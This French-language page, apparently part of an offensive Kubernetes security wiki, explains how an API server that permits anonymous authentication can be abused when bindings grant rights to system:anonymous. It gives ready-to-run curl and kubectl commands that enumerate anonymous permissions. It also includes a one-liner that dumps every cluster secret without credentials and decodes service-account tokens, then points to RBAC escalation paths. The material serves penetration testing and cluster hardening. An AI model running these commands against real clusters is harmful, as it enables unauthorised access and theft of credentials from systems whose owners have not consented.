---
title: "Accès API anonyme : requêtes non authentifiées que le serveur d'API honore"
order: 4
description: "Lorsque le serveur d'API s'exécute avec l'authentification anonyme activée et qu'une liaison accorde des droits à l'utilisateur system:anonymous ou au groupe system:unauthenticated, des appelants non authentifiés peuvent agir. Historiquement, certains clusters les liaient à des rôles puissants ; même un accès en lecture aux secrets ou à la découverte via une identité anonyme constitue un point d'ancrage sans aucun identifiant."
keywords:
  - anonymous-auth
  - system:anonymous
  - system:unauthenticated
  - serveur d'api
  - non authentifié
---

# Accès API anonyme

Le serveur d'API accepte les requêtes non authentifiées en tant qu'utilisateur `system:anonymous` dans le groupe `system:unauthenticated` lorsque `--anonymous-auth` est activé, ce qui est le cas par défaut. Normalement, ces identités n'ont aucun droit, de sorte que les requêtes anonymes sont refusées à l'autorisation. L'exposition apparaît lorsqu'un RoleBinding ou un ClusterRoleBinding accorde une permission quelconque à `system:anonymous` ou `system:unauthenticated`, que ce soit par une liaison de commodité imprudente ou par un composant qui les a liés largement. Dès lors, un attaquant agit sans aucun identifiant.

Testez ce que l'anonyme peut faire :

```bash
# unauthenticated calls: no token, no client cert
curl -sk https://<api>:6443/version
curl -sk https://<api>:6443/api/v1/namespaces/default/pods
# check anonymous permissions explicitly
kubectl --insecure-skip-tls-verify --server=https://<api>:6443 \
  auth can-i --list --as=system:anonymous
kubectl ... auth can-i get secrets --as=system:anonymous --all-namespaces
```

## De l'anonyme à l'impact

```bash
# if anonymous can read secrets, harvest tokens and act as a real identity
curl -sk https://<api>:6443/api/v1/secrets | \
  python3 -c 'import sys,json,base64;[print(base64.b64decode(d.get("data",{}).get("token","")).decode("utf-8","replace")[:60]) for d in json.load(sys.stdin)["items"]]'
# if anonymous can create pods or bindings, escalate via the RBAC routes
```

## Notes d'exploitation

- Le `system:anonymous` par défaut n'a aucun droit ; un appel anonyme qui fonctionne signifie qu'une liaison existe pour lui, de sorte que la première étape est `auth can-i --list --as=system:anonymous` pour en apprendre la portée.
- Même la découverte anonyme (`/api`, `/apis`, `/version`) confirme l'accessibilité et la version pour affiner les attaques ultérieures ; une lecture anonyme des `secrets` ou des `pods` est un point d'ancrage direct.
- Tout verbe d'écriture anonyme mène au groupe d'escalade RBAC, par exemple [Création de pod vers nœud](../rbac-privilege-escalation/pod-creation-to-node.md) ou [Verbes escalate et bind](../rbac-privilege-escalation/escalate-and-bind-verbs.md).

## Références

- [Kubernetes : requêtes anonymes](https://kubernetes.io/docs/reference/access-authn-authz/authentication/#anonymous-requests)
- [kube-hunter : anonymous access](https://aquasecurity.github.io/kube-hunter/)
